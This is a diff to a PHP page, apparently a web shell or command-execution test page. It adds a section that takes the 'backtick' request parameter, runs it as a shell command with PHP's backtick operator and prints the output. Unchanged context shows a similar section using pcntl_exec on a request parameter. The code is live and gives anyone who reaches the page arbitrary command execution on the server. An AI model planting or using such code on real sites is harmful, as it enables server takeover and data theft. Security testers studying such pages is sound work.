@@ -80,6 +80,16 @@
         echo "\n</xmp></pre>";
     }
 ?>
+        <h2>Run shell commands with <code>`{...}`</code> (backtick and brackets)</h2>
+        <pre>&lt;?php print(`{$_REQUEST['backtick']}`); ?&gt; // Disabled if safe_mode is enabled or shell_exec() is disabled</pre>
+<?php
+    add_shell_cmd_links('backtick');
+    if (!empty($_REQUEST['backtick'])) {
+        echo "<pre><xmp>";
+        print(`{$_REQUEST['backtick']}`);
+        echo "\n</xmp></pre>";
+    }
+?>
         <h2>Run shell commands with <code>pcntl_exec</code></h2>
         <pre>&lt;?php if (pcntl_fork() == 0)pcntl_exec($_REQUEST['pcntl_exec']); ?&gt;</pre>
 <?php
